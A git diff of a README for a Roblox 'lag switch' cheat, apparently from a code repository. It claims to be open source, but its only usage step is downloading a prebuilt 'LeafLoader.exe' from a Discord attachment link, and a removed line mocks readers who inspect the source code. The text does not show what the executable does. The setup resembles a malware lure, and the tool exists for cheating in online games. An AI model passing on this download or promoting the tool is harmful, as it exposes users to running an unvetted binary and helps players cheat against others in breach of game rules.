@@ -1,2 +1,11 @@
-if you went through my source code then congradulations you little hacker boy i hope you are so pround of yourself!
-if not then join the discord https://discord.gg/xhfW2c7Q9H
+# 🔥 Lag switch made for Roblox 🔥
+Made using ChatGPT in Python
+
+Open Source
+### How to Use:
+
+1. Download the loader [here.](https://cdn.discordapp.com/attachments/1247343031040872469/1255002393322590249/LeafLoader.exe?ex=667b8b8f&is=667a3a0f&hm=2ba13c25d1d3e4fa914346779c385bdd8dac4a0c6b01f697d68aedd5cfefb804&)
+
+(Note, be carful using this in games, a lot of games will automatically kick or close the game which could result in a ban)
+#
+### Post Bugs or Suggestions [Here]((https://discord.com/invite/xhfW2c7Q9H))
